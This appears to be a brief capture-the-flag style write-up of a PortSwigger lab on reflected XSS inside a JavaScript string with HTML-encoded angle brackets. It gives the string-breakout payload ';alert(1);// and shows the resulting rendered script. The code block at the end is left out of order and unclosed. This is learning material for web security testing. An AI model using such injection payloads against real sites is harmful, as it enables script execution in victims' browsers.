# 🐞 Reflected XSS in JavaScript String (Angle Brackets HTML-Encoded)

## 🧪 Lab Title
**Reflected XSS into a JavaScript string with angle brackets HTML encoded**  
**Platform**: PortSwigger Web Security Academy

---

## 🔍 Vulnerability Type
**Reflected Cross-Site Scripting (XSS)**  
The user input is reflected inside a **JavaScript string context**. Even though angle brackets (`<`, `>`) are HTML-encoded, improper handling of quotes and special characters allows JavaScript injection.

---

## 🧠 Description
The application dynamically includes a GET parameter inside a JavaScript string:

## Payload Used 
';alert(1);// 

## Final Rendered Script
<script>
  var search = '';alert(1);//';
</script>


```javascript
var search = 'USER_INPUT';
